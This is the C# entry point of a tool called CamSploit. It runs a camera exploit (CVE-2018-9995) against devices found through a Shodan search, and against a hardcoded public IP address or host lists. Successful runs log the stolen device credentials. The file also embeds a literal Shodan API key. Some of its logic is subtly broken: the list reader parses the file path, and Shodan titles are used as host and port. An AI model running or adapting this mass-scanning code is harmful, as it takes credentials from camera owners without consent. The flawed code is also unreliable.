using System.Collections.Generic;

namespace CamSploit
{
	public class Program
	{
		static void Main(string[] args)
		{
            //We select the output
            using (var writter = new Writter())
            {
                //We select the exploits
                var exploits = new List<IExploit>();
                exploits.Add(new CVE_2018_9995());

                //We select the input
                //RunFromShodanFile("data.json", exploits, writter);
                //RunFromListFile(list.txt", exploits, writter);
                //RunForHost("85.105.160.112", "80", exploits, writter);
                RunForHostAndSearchInShodan("i0euIqQ6LzmHdAN9PzI1o07deHKNrC6W", exploits, writter);
            }
        }
        
        static void RunForHost(string ip, string port, IList<IExploit> exploits, Writter writter)
		{
            var cam = new Camera(ip, port);
            RunForCamera(cam, exploits, writter);
		}        

		static void RunFromListFile(string filePath, IList<IExploit> exploits, Writter writter)
		{
			using (var file = new TxtFile(filePath))
			{
                file.Open();
                string line;
				while ((line = file.ReadLine()) != null)
				{
					var splitted = filePath.Split (':');

                    var cam = new Camera(splitted[0], splitted[1]);
                    RunForCamera(cam, exploits, writter);
				}

                file.Close();
			}
		}

        static void RunFromShodanFile(string file, IList<IExploit> exploits, Writter writter)
        {
            foreach (var r in ShodanHelper.LoadJsonResult(file))
                RunForCamera(r, exploits, writter);
        } 
        
        static void RunForHostAndSearchInShodan(string apiKey, IList<IExploit> exploits, Writter writter)
        {
            foreach (var e in exploits)
            {
                foreach (var result in ShodanHelper.Search(apiKey, e.ShodanSearchQuery).Matches)
                {
                    var cam = new Camera(result.Title, result.Title);
                    RunForCamera(cam, e, writter);
                }
            }
        }

        static void RunForCamera(Camera cam, IList<IExploit> exploits, Writter writter)
        {
            foreach(var e in exploits)
                RunForCamera(cam, e, writter);
        }

        static void RunForCamera(Camera cam, IExploit e, Writter writter)
        {
            writter.InitTest(e.CVE, cam);
            var credencials = e.Exploit(cam.UrlHTTP);

            if (credencials != null)
                writter.TestSuccess(e.CVE, cam, credencials);
            else
                writter.TestFailed(e.CVE, cam);
        }
	}
}